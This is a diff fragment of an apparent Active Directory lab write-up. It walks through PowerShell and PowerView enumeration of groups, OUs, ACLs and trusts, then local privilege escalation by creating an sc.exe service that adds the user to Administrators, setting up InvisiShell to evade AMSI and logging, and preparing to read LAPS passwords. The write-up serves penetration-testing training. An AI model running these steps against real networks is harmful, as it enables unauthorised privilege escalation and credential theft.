+</p></div><div dir="auto"><p class="">By specifying the <code>-Server</code> parameter and pointing it to the <strong>root domain</strong> (<code>it.gcb.local</code>), the command will direct the query to the correct location where the <strong>Enterprise Admins group</strong> resides, allowing the enumeration to succeed.</p></div><div dir="auto"><p class=""><code>Get-ADGroup -Identity 'Enterprise Admins' -Properties * -Server 'gcb.local'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><h3 class=""><strong>Why Did the Query Work with </strong><code><strong>Server</strong></code><strong> and the Root Domain?</strong></h3></div><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc"><strong>Specifying the Root Domain</strong>:<div dir="auto"><ul class="bulleted-list"><li style="list-style-type:circle">By adding the <code>Server</code> parameter and pointing it to the <strong>root domain controller</strong> (<code>gcb.local</code>), the query is explicitly directed to the correct domain where the <strong>Enterprise Admins group</strong> resides.</li></ul></div><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:circle">The <strong>Enterprise Admins group</strong> is located in the <strong>root domain</strong> of the forest (<code>gcb.local</code>) because it is a forest-wide administrative group and does not exist in any child domains.</li></ul></div></li></ul></div><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc"><strong>Active Directory Hierarchy</strong>:<div dir="auto"><ul class="bulleted-list"><li style="list-style-type:circle">Active Directory is designed as a hierarchical system with the root domain serving as the topmost level in the forest.</li></ul></div><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:circle">Forest-wide objects, like the <strong>Enterprise Admins group</strong>, are only created and stored in the <strong>root domain</strong>’s directory partition.</li></ul></div><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:circle">Querying the root domain ensures the command can locate and retrieve the information about the group.</li></ul></div></li></ul></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">We now can retrieve the information from Enterprise Admins group and we can also enumerate the members of this group.</p></div><div dir="auto"><p class=""><code>Get-ADGroupMember -Identity 'Enterprise Admins' -Server 'gcb.local' | Select -ExpandProperty 'SamAccountName'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.933349609375px"/></a></figure></div><div dir="auto"><p class="">Well, we can see above that only the Administrator is part of this special group.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Get-ADGroup -Identity 'Administrators' -Properties *</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Get-ADGroupMember -Identity 'Administrators' | Select -ExpandProperty 'SamAccountName’</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">We can also see that. the Domain Administrator and also members of groups Domain Admins and Enterprise Admins area also part of the Administrators group.</p></div><div dir="auto"><h2 class="">Enumerating Organizational Units</h2></div><div dir="auto"><p class="">Let’s now start enumerating all the Organizational Units we have configured in this domain.</p></div><div dir="auto"><p class=""><code> Get-ADOrganizationalUnit -Filter *</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class=""><code>Get-ADOrganizationalUnit -Filter * | Select -Expandproperty 'Name'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">It is possible to see that inside <code><strong>it.gcb.local</strong></code> domain we have 4 OUs configured.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Let’s use <code><strong>Domain Controllers</strong></code> <strong>OU</strong> and list all the computers inside this OU.</p></div><div dir="auto"><p class=""><code>Get-ADOrganizationalUnit -Identity 'OU=Domain Controllers,DC=it,DC=gcb,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | Select name</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Get-ADOrganizationalUnit -Identity 'OU=AppServers,DC=it,DC=gcb,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | Select name</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Get-ADOrganizationalUnit -Identity 'OU=ITEmployees,DC=it,DC=gcb,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | Select name</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.9833984375px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Get-ADOrganizationalUnit -Identity 'OU=PreProd,DC=it,DC=gcb,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | Select name</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">During our OU enumeration, we mapped out the organizational structure of the domain to better understand how assets, users, and groups are logically separated and managed. This process allowed us to identify custom OUs like ITEmployees, which often hold valuable targets such as workstations, service accounts, and employee groups. By analyzing the distinguished names and hierarchy, we gained visibility into the administrative boundaries and delegation models within the environment. This also helped us pinpoint high-value areas for privilege escalation and lateral movement, especially where group policies or access controls might be misconfigured.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h2 class="">Enumerating ACLs</h2></div><div dir="auto"><p class="">Instead of enumerating the each ACLs on the domain, I decided to do it differently. I decided to use Find-InterestingDomainACL which is a module from PowerView that allows us to verify really interesting ACLs by passing the user or even groups as well. For example, it will show us if a specific user or group  itself have some interesting ACLs like GenericAll, GenericWrite, etc over an Object.</p></div><div dir="auto"><p class=""><code>Import-Module .\PowerView.ps1</code></p></div><div dir="auto"><p class=""><code>Find-InterestingDomainACL -ResolveGUIDs -Verbose</code></p></div><div dir="auto"><h3 class="">orgadmin User - Domain Replication Rights</h3></div><div dir="auto"><p class="">The <strong>orgadmin</strong> user has the <strong>DS-Replication-Get-Changes</strong>, <strong>DS-Replication-Get-Changes-All</strong>, and <strong>DS-Replication-Get-Changes-In-Filtered-Set</strong> rights. These permissions grant the ability to replicate directory data, including sensitive information such as password hashes. This user can effectively perform <strong>DCSync attacks</strong>, making it a high-value target.</p></div><div dir="auto"><h3 class="">organizationadmins Group - WriteDacl</h3></div><div dir="auto"><p class="">The <strong>organizationadmins</strong> group has <strong>WriteDacl</strong> permissions on the domain root. This allows modifying the DACL (Discretionary Access Control List) of the domain object itself. This permission can be exploited to grant additional rights or even take over domain admin privileges.</p></div><div dir="auto"><h3 class="">ITEmployeesUsers Group - Read/Write Property</h3></div><div dir="auto"><p class="">The <strong>ITEmployeesUsers</strong> group has <strong>ReadProperty</strong>, <strong>WriteProperty</strong>, and <strong>GenericExecute</strong> rights over the <strong>LocalAdmins</strong> object. This means members of this group can read and modify attributes on the <strong>LocalAdmins</strong> group, potentially allowing privilege escalation through property manipulation.</p></div><div dir="auto"><h3 class="">IT-SQLSRV02$ Computer - GenericAll</h3></div><div dir="auto"><p class="">The <strong>IT-SQLSRV02$</strong> computer account has <strong>GenericAll</strong> rights on itself. This means it has full control over its own object, which is standard, but if misconfigured, it could lead to potential abuse, especially if credentials or delegation are involved.</p></div><div dir="auto"><h3 class="">IT-EMPLOYEETEST$ and ITEmployeesMachines - GenericWrite</h3></div><div dir="auto"><p class="">The <strong>IT-EMPLOYEETEST$</strong> computer and <strong>ITEmployeesMachines</strong> group have <strong>GenericWrite</strong>, <strong>ListChildren</strong>, and <strong>ReadProperty</strong> rights on the <strong>IT-TRACK01</strong> computer object. This combination of permissions can be exploited to modify attributes or inject malicious changes.</p></div><div dir="auto"><h3 class="">IT-DC$ Computer - Full Control on SYSVOL and DFSR</h3></div><div dir="auto"><p class="">The <strong>IT-DC$</strong> computer account has <strong>GenericAll</strong> rights on <strong>DFSR-LocalSettings</strong>, <strong>Domain System Volume</strong>, and <strong>SYSVOL Subscription</strong>. This allows full control over domain replication data, potentially enabling attacks on GPOs or tampering with system volume contents.</p></div><div dir="auto"><h3 class="">DnsAdmins Group - Full DNS Control</h3></div><div dir="auto"><p class="">The <strong>DnsAdmins</strong> group has <strong>CreateChild</strong>, <strong>DeleteChild</strong>, <strong>ListChildren</strong>, <strong>ReadProperty</strong>, <strong>DeleteTree</strong>, <strong>ExtendedRight</strong>, <strong>Delete</strong>, <strong>GenericWrite</strong>, <strong>WriteDacl</strong>, and <strong>WriteOwner</strong> permissions on the DNS server object. This grants complete administrative control over the DNS infrastructure, which could be exploited to manipulate name resolution or gain further domain access.</p></div><div dir="auto"><h3 class="">LocalAdmins Group - LAPS Password Read</h3></div><div dir="auto"><p class="">The <strong>LocalAdmins</strong> group has <strong>ReadProperty</strong> and <strong>ExtendedRight</strong> over the <strong>ms-Mcs-AdmPwd</strong> attribute, which is typically associated with LAPS (Local Administrator Password Solution). This means members can read the local admin password for systems that use LAPS.</p></div><div dir="auto"><h3 class="">IT-APPSRV01$ and IT-PREPROD$ Computers - Full Control</h3></div><div dir="auto"><p class="">The <strong>IT-APPSRV01$</strong> and <strong>IT-PREPROD$</strong> computer accounts have <strong>GenericAll</strong> rights on their respective objects. This means these systems have full control over their own Active Directory objects, which could be leveraged for privilege escalation if compromised.</p></div><div dir="auto"><h3 class="">IT-EMPLOYEE40 to IT-EMPLOYEE49 - GenericAll</h3></div><div dir="auto"><p class="">All these <strong>IT-EMPLOYEE</strong> computer accounts have <strong>GenericAll</strong> rights on their own objects, allowing full control over their own AD attributes. This is typical for computer accounts but could be abused if an attacker takes control of any of these systems.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -Match 'employee41'}</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.9833984375px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -Match 'ITEmployees'}</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.9833984375px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -Match 'LocalAdmins'}</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.9833984375px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h2 class=""><strong>Enumerating Domain, Forest &amp; Trusts </strong></h2></div><div dir="auto"><p class=""><code>Import-Module .\Microsoft.ActiveDirectory.Management.dll</code></p></div><div dir="auto"><p class=""><code>Import-Module .\ActiveDirectory\ActiveDirectory.psd1</code></p></div><div dir="auto"><p class=""><code>Get-ADForest</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">This command quickly maps the forest's structure, identifies key servers (e.g., Domain Controllers, Global Catalogs), and highlights potential targets for attacks or lateral movement.</p></div><div dir="auto"><p class="">The <code>Get-ADForest</code> command enumerates the structure and key components of the Active Directory <strong>forest</strong>. It provides a summary of:</p></div><div dir="auto"><ol class="numbered-list" start="1" type="1"><li><strong>Domains</strong>: Lists all domains in the forest (e.g., <code>gcb.local</code> and <code>it.gcb.local</code>).</li></ol></div><div dir="auto"><ol class="numbered-list" start="2" type="1"><li><strong>FSMO Roles</strong>:<div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc"><strong>DomainNamingMaster</strong>: Server managing domain additions/removals.</li></ul></div><div dir="auto"><ul class="bulleted-list"><li style="list-style-type:disc"><strong>SchemaMaster</strong>: Server managing schema updates.</li></ul></div></li></ol></div><div dir="auto"><ol class="numbered-list" start="3" type="1"><li><strong>Global Catalogs</strong>: Servers hosting cross-domain data for faster queries.</li></ol></div><div dir="auto"><ol class="numbered-list" start="4" type="1"><li><strong>Forest Functional Level</strong>: Features available in the forest (<code>Windows2016Forest</code>).</li></ol></div><div dir="auto"><ol class="numbered-list" start="5" type="1"><li><strong>Application Partitions</strong>: DNS replication zones (<code>DomainDnsZones</code> and <code>ForestDnsZones</code>).</li></ol></div><div dir="auto"><ol class="numbered-list" start="6" type="1"><li><strong>Root Domain</strong>: Identifies the forest's root domain (<code>gcb.local</code>).</li></ol></div><div dir="auto"><ol class="numbered-list" start="7" type="1"><li><strong>Sites</strong>: Lists AD sites (<code>Default-First-Site-Name</code>).</li></ol></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>(Get-ADForest).Domains</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.933349609375px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h3 class="">Enumerating Trusts</h3></div><div dir="auto"><p class="">We can also map or enumerate all the Trusts we do have from the current domain we are part of (<code><strong>it.gcb.local</strong></code>).</p></div><div dir="auto"><p class=""><code>Get-ADTrust -Filter *</code></p></div><div dir="auto"><ul class="toggle"><li><details open=""><summary><strong>AD-Trust</strong></summary><div dir="auto"><pre class="code code-wrap"><code class="language-Bash">Direction               : BiDirectional
 DisallowTransivity      : False
 DistinguishedName       : CN=gcb.local,CN=System,DC=it,DC=gcb,DC=local
 ForestTransitive        : False
@@ -1255,203 +924,36 @@ TrustingPolicy          :
 TrustType               : Uplevel
 UplevelOnly             : False
 UsesAESKeys             : False
-UsesRC4Encryption       : False</code></pre>
-</details>
-
-<p>Our current child domain <strong>it.gcb.local</strong> has three trust relationships established with other domains.</p>
-
-<ol>
-<li><strong>gcb.local</strong>: This is a <strong>bi-directional, intra-forest trust</strong>, meaning both domains trust each other and are part of the same forest. The trust is not transitive and does not use selective authentication. This setup is typical within the same organization or environment.</li>
-<li><strong>msp.local</strong>: This is an <strong>inbound trust</strong>, meaning that the <strong>msp.local</strong> domain trusts the <strong>it.gcb.local</strong> domain, but not vice versa. It is an <strong>external trust</strong> (not intra-forest), indicating that <strong>msp.local</strong> likely belongs to a separate forest or organization. The trust is also <strong>non-transitive</strong> and does not use selective authentication.</li>
-<li><strong>gcbfinance.local</strong>: This is a <strong>bi-directional, external trust</strong>, allowing mutual trust between <strong>it.gcb.local</strong> and <strong>gcbfinance.local</strong>. It has <strong>TGT delegation enabled</strong>, which may allow cross-domain Kerberos delegation. Additionally, <strong>SID filtering is quarantined</strong>, indicating potential restrictions on SID history usage to prevent unauthorized access from external domains.</li>
-</ol>
-
-<p>In summary, the current environment provides interesting trust relationships that can be leveraged for cross-domain attacks.</p>
-
-<p>Since we do have a 2-Ways or BiDirectional trust with an External Trust  <code><strong>gcbfinance.local</strong></code>, we can also query the Trusts <code><strong>gcbfinance.local</strong></code> have.</p>
-
-<p><code>Get-ADTrust -Filter * -Server 'gcbfinance.local'</code></p>
-
-<figure><img src="../../assets/crtm/image 33.png" alt="gcbfinance.local Trusts"/></figure>
-
-<p>The enumeration revealed a bi-directional, non-transitive trust between the <strong>it.gcb.local</strong> child domain and the <strong>gcbfinance.local</strong> domain. This relationship is established as an <strong>Uplevel</strong> trust, indicating both domains are at the same functional level. The trust is <strong>not forest-transitive</strong>, meaning it does not extend beyond these two domains.</p>
-
-<p>Interestingly, <strong>SID filtering is enabled (quarantined)</strong>, which helps protect against unauthorized SID history usage from the external domain. Additionally, <strong>TGT delegation is disabled</strong>, which means that cross-domain Kerberos ticket-granting ticket delegation is not allowed, reducing the risk of credential abuse.</p>
-
-<p>This trust configuration suggests a controlled and secure relationship, primarily focused on allowing authentication and access between the two domains while minimizing security risks.</p>
-
-<p>Now let's enumerate the trusts of our root or Parent Domain (<code>gcb.local</code>).</p>
-
-<p><code>Get-ADTrust -Filter 'IntraForest -ne $True' -Server (Get-ADForest).Name</code></p>
-
-<figure><img src="../../assets/crtm/image 34.png" alt="gcb.local Trusts"/></figure>
-
-<p>It seems like our root domain does not have other trusts.</p>
-
-<h1>Local Privesc</h1>
-
-<p>At this point, we have gathered enough information about the domain and its current configuration to start planning our moves. Our goal is to gain higher-level privileges, giving us full control over the system.</p>
-
-<p>Let's use <a href="https://github.com/itm4n/PrivescCheck">PivescCheck</a> to enumerate if we have some misconfiguration locally, it will help us to find attack vectors for local privilege escalation</p>
-
-<p><code>. .\PrivescCheck.ps1</code></p>
-
-<p><code>Invoke-PrivescCheck</code></p>
-
-<figure><img src="../../assets/crtm/image 35.png" alt="PrivescCheck Results"/></figure>
-
-<p>We found that our current user, belonging to the <strong>IT\ITEmployeesUsers</strong> group, had <strong>AllAccess</strong> permissions on the <strong>Service Control Manager (SCM)</strong>. This meant that we could perform any action related to managing services, a significant foothold for privilege escalation.</p>
-
-<p>Understanding the potential of SCM abuse, we planned to create a new service that would add our user to the <strong>Builtin\Administrators</strong> group. To do this, we ...</p>
-
-<p>Based on our previous enumeration phase, when we checked the ACLs we found the followin:</p>
-
-<h3>ITEmployeesUsers Group - Read/Write Property</h3>
-
-<p>The <strong>ITEmployeesUsers</strong> group has <strong>ReadProperty</strong>, <strong>WriteProperty</strong>, and <strong>GenericExecute</strong> rights over the <strong>LocalAdmins</strong> object. This means members of this group can read and modify attributes on the <strong>LocalAdmins</strong> group, potentially allowing privilege escalation through property manipulation.</p>
-
-<h3>LocalAdmins Group - LAPS Password Read</h3>
-
-<p>The <strong>LocalAdmins</strong> group has <strong>ReadProperty</strong> and <strong>ExtendedRight</strong> over the <strong>ms-Mcs-AdmPwd</strong> attribute, which is typically associated with LAPS (Local Administrator Password Solution). This means members can read the local admin password for systems that use LAPS.</p>
-
-<p>Since our user is already a member of the <strong>ITEmployeesUsers</strong> group, we automatically inherit the <strong>ReadProperty</strong>, <strong>WriteProperty</strong>, and <strong>GenericExecute</strong> rights over the <strong>LocalAdmins</strong> object. This means we can directly leverage these privileges to manipulate attributes or memberships within the <strong>LocalAdmins</strong> group.</p>
-
-<p>Given this context, our next step will focus on utilizing the <strong>WriteProperty</strong> permission to add our current user to the <strong>LocalAdmins</strong> group. This will grant us local administrative rights. Additionally, since we have <strong>ReadProperty</strong> and <strong>ExtendedRight</strong> over the <strong>ms-Mcs-AdmPwd</strong> attribute via the <strong>LocalAdmins</strong> group, we will also attempt to retrieve the LAPS-managed local admin password.</p>
-
-<p>By exploiting both of these paths, we aim to gain local admin privileges effectively and ensure full control over the target system.</p>
-
-<p>Lets once again run InvisiShell and AMSI bypass as well.</p>
-
-<pre><code>set COR_ENABLE_PROFILING=1
+UsesRC4Encryption       : False</code></pre></div><div dir="auto"><p class="">
+</p></div></details></li></ul></div><div dir="auto"><p class="">Our current child domain <strong>it.gcb.local</strong> has three trust relationships established with other domains.</p></div><div dir="auto"><ol class="numbered-list" start="1" type="1"><li><strong>gcb.local</strong>: This is a <strong>bi-directional, intra-forest trust</strong>, meaning both domains trust each other and are part of the same forest. The trust is not transitive and does not use selective authentication. This setup is typical within the same organization or environment.</li></ol></div><div dir="auto"><ol class="numbered-list" start="2" type="1"><li><strong>msp.local</strong>: This is an <strong>inbound trust</strong>, meaning that the <strong>msp.local</strong> domain trusts the <strong>it.gcb.local</strong> domain, but not vice versa. It is an <strong>external trust</strong> (not intra-forest), indicating that <strong>msp.local</strong> likely belongs to a separate forest or organization. The trust is also <strong>non-transitive</strong> and does not use selective authentication.</li></ol></div><div dir="auto"><ol class="numbered-list" start="3" type="1"><li><strong>gcbfinance.local</strong>: This is a <strong>bi-directional, external trust</strong>, allowing mutual trust between <strong>it.gcb.local</strong> and <strong>gcbfinance.local</strong>. It has <strong>TGT delegation enabled</strong>, which may allow cross-domain Kerberos delegation. Additionally, <strong>SID filtering is quarantined</strong>, indicating potential restrictions on SID history usage to prevent unauthorized access from external domains.</li></ol></div><div dir="auto"><p class="">In summary, the <strong>it.gcb.local</strong> domain is configured to trust and be trusted by <strong>gcb.local</strong> (intra-forest), accept inbound trust from <strong>msp.local</strong> (external), and maintain a two-way trust with <strong>gcbfinance.local</strong> (external) with <strong>TGT delegation</strong> enabled.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Since we do have a 2-Ways or BiDirectional trust with an External Trust  <code><strong>gcbfinance.local</strong></code>, we can also query the Trusts <code><strong>gcbfinance.local</strong></code> have.</p></div><div dir="auto"><p class=""><code>Get-ADTrust -Filter * -Server 'gcbfinance.local'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.9833984375px"/></a></figure></div><div dir="auto"><p class="">The enumeration revealed a bi-directional, non-transitive trust between the <strong>it.gcb.local</strong> child domain and the <strong>gcbfinance.local</strong> domain. This relationship is established as an <strong>Uplevel</strong> trust, indicating both domains are at the same functional level. The trust is <strong>not forest-transitive</strong>, meaning it does not extend beyond these two domains.</p></div><div dir="auto"><p class="">Interestingly, <strong>SID filtering is enabled (quarantined)</strong>, which helps protect against unauthorized SID history usage from the external domain. Additionally, <strong>TGT delegation is disabled</strong>, which means that cross-domain Kerberos ticket-granting ticket delegation is not allowed, reducing the risk of credential abuse.</p></div><div dir="auto"><p class="">This trust configuration suggests a controlled and secure relationship, primarily focused on allowing authentication and access between the two domains while minimizing potential security risks from improper delegation or SID history manipulation.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Now let’s  enumerate the trusts of our root or Parent Domain (<code>gcb.local</code>).</p></div><div dir="auto"><p class=""><code>Get-ADTrust -Filter 'IntraForest -ne $True' -Server (Get-ADForest).Name</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">It seems like our root domain does not have other trusts.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h1 class="">Local Privesc</h1></div><div dir="auto"><p class="">At this point, we have gathered enough information about the domain and its current configuration to start planning our moves. Our goal is to gain higher-level privileges, giving us full control over the system.</p></div><div dir="auto"><p class="">Let’s use <a href="https://github.com/itm4n/PrivescCheck">PivescCheck</a> to enumerate if we have some misconfiguration locally, it will help us to find attack vectors for local privilege escalation</p></div><div dir="auto"><p class=""><code>. .\PrivescCheck.ps1</code></p></div><div dir="auto"><p class=""><code>Invoke-PrivescCheck</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.9833984375px"/></a></figure></div><div dir="auto"><p class="">We found that our current user, belonging to the <strong>IT\ITEmployeesUsers</strong> group, had <strong>AllAccess</strong> permissions on the <strong>Service Control Manager (SCM)</strong>. This meant that we could perform any action related to managing services, a significant foothold for privilege escalation.</p></div><div dir="auto"><p class="">Understanding the potential of SCM abuse, we planned to create a new service that would add our user to the <strong>Builtin\Administrators</strong> group. To do this, we can use the <code>sc.exe</code> utility to create a service called <strong>localpriv or any name of our choice</strong>. We configure it to execute the <code>cmd.exe /c net localgroup administrators IT\employee41 /add</code> command, which will add our user to the local administrators group. We also set the service to start automatically. This configuration is important because we know we do not have the necessary permissions to manually start or stop the service.</p></div><div dir="auto"><p class=""><code>sc create localpriv binPath= "cmd.exe /c net localgroup administrators IT\employee41 /add" start=auto</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.9666748046875px"/></a></figure></div><div dir="auto"><p class="">Now that we were able to successfully create the service to make it add our user into Builtin\Administrators group, we are not able to start or stop this service because we do not have permission, but since we have it as set to auto, if the host is restarted the service will auto start during the boot. Since we have the SeShutDownPrivilege right we can  use the command shutdown to reboot the host.<br/><code>Note: As long as we have the privilege it doesn’t matter if the privilege is enabled or disabled, it will simply work.</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">We then issue the system shutdown command to reboot the machine. Our reasoning was that since the service was configured to start automatically, it would execute during the system boot process, effectively running our command to add the user to the administrators group.</p></div><div dir="auto"><p class=""><code>shutdown /r /t 0</code></p></div><div dir="auto"><p class="">The command above will simply restart the machine and after reboot, open a new cmdlet session as administrator and if we issue the command <code><strong>whoami /all</strong></code> we simply see that our abuse worked. We are now Local Administrator.</p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">This method demonstrated that even if a privilege appears disabled, as long as it exists in the current context, it can be leveraged effectively for privilege escalation. Additionally, configuring services to start automatically upon boot can be an effective way to bypass the inability to manually start the service.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Based on our previous enumeration phase, when we checked the ACLs we found the followin:</p></div><div dir="auto"><h3 class="">ITEmployeesUsers Group - Read/Write Property</h3></div><div dir="auto"><p class="">The <strong>ITEmployeesUsers</strong> group has <strong>ReadProperty</strong>, <strong>WriteProperty</strong>, and <strong>GenericExecute</strong> rights over the <strong>LocalAdmins</strong> object. This means members of this group can read and modify attributes on the <strong>LocalAdmins</strong> group, potentially allowing privilege escalation through property manipulation.</p></div><div dir="auto"><h3 class="">LocalAdmins Group - LAPS Password Read</h3></div><div dir="auto"><p class="">The <strong>LocalAdmins</strong> group has <strong>ReadProperty</strong> and <strong>ExtendedRight</strong> over the <strong>ms-Mcs-AdmPwd</strong> attribute, which is typically associated with LAPS (Local Administrator Password Solution). This means members can read the local admin password for systems that use LAPS.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Since our user is already a member of the <strong>ITEmployeesUsers</strong> group, we automatically inherit the <strong>ReadProperty</strong>, <strong>WriteProperty</strong>, and <strong>GenericExecute</strong> rights over the <strong>LocalAdmins</strong> object. This means we can directly leverage these privileges to manipulate attributes or memberships within the <strong>LocalAdmins</strong> group.</p></div><div dir="auto"><p class="">Given this context, our next step will focus on utilizing the <strong>WriteProperty</strong> permission to add our current user to the <strong>LocalAdmins</strong> group. This will grant us local administrative rights. Additionally, since we have <strong>ReadProperty</strong> and <strong>ExtendedRight</strong> over the <strong>ms-Mcs-AdmPwd</strong> attribute via the <strong>LocalAdmins</strong> group, we will also attempt to retrieve the LAPS-managed local admin password.</p></div><div dir="auto"><p class="">By exploiting both of these paths, we aim to gain local admin privileges effectively and ensure full control over the target system.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Lets once again run InvisiShell and AMSI bypass as well.</p></div><div dir="auto"><pre class="code code-wrap"><code class="language-Bash">set COR_ENABLE_PROFILING=1
 set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
 
-REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916_db}" /f
-REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916_db}\InprocServer32" /f
-REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916_db}\InprocServer32" /ve /t REG_SZ /d "%~dp0InShellProf.dll" /f
+REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
+REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
+REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "%~dp0InShellProf.dll" /f
 
 powershell
 
 set COR_ENABLE_PROFILING=
 set COR_PROFILER=
-REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916_db}" /f</code></pre>
-
-<figure><img src="../../assets/crtm/image.png" alt="InvisiShell"/></figure>
-
-<p>Once the new PowerShell session is initiated after running InvisiShell, we can then execute the following AMSI bypass into the current session.</p>
-
-<p><code>Import-Module .\ADModule-master\Microsoft.ActiveDirectory.Management.dll</code></p>
-
-<p><code>Import-Module .\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</code></p>
-
-<p><code>Import-Module .\AdmPwd.PS\AdmPwd.PS.psd1 -Verbose</code></p>
-
-<figure><img src="../../assets/crtm/image 39.png" alt="AdmPwd Import"/></figure>
-
-<p>Now that we have imported the 2 modules, Let's enumerate the Organizational Unit where LAPS is configured.
-For that we will use the script <code>Get-LapsPermissions.ps1</code>.</p>
-
-<p><code>.\Get-LAPSPermissions.ps1 -Verbose</code></p>
-
-<figure><img src="../../assets/crtm/image 40.png" alt="LAPS Permissions"/></figure>
-
-<ol>
-<li><strong>Read Rights</strong>:
-<ul>
-<li><strong>OrganizationalUnit</strong>: This indicates the Organizational Unit (OU) in Active Directory where the LAPS permissions are applied, specifically the <code>OU=AppServers</code> OU.</li>
-</ul>
-</li>
-</ol>
-
-<ol>
-<li><strong>Write Rights</strong>:
-<ul>
-<li><strong>OrganizationalUnit</strong>: Again, this is the OU where the permission is applied, which is the same as the read rights (<code>OU=AppServers</code>).</li>
-<li><strong>IdentityReference</strong>: This indicates the security principal with <strong>write access</strong> to the LAPS attributes.
-<p><code>NT AUTHORITY\SELF</code></p>
-<p>This means that the computer account (via the SELF security principal) can <strong>write its own password</strong> (e.g., update the <code>ms-Mcs-AdmPwd</code> attribute) to Active Directory. <br/>This is a standard LAPS configuration.</p>
-</li>
-</ul>
-</li>
-</ol>
-
-<h3>Interpretation:</h3>
-
-<ul>
-<li><strong>Read Rights</strong>: The <code><strong>TI\LocalAdmins</strong></code> group has permission to retrieve the local admin passwords for machines in the <code><strong>AppServers</strong></code> OU.</li>
-</ul>
-
-<ul>
-<li><strong>Write Rights</strong>: Each computer in the AppServers OU is configured to write its own password to AD.</li>
-</ul>
-
-<p>We can see with our enumeration that LocalAdmins group have the Read Right permission for LAPS configuration, meaning that members of LocalAdmins group can read the clear-text password.
-As member of ITEmployeesUsers group we have <strong>ReadProperty</strong>, <strong>WriteProperty</strong>, and <strong>GenericExecute</strong> rights over the <strong>LocalAdmins</strong> object. Let's take advantage of the <code><strong>WriteProperty</strong></code> and Add ourselves as member of LocalAdmins group.</p>
-
-<p>Let's now enumerate all the Computers that belong to AppServers OU using ADModule.</p>
-
-<p><code>Get-ADOrganizationalUnit -Identity 'OU=AppServers,DC=it,DC=gcb,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | Select 'Name'</code></p>
-
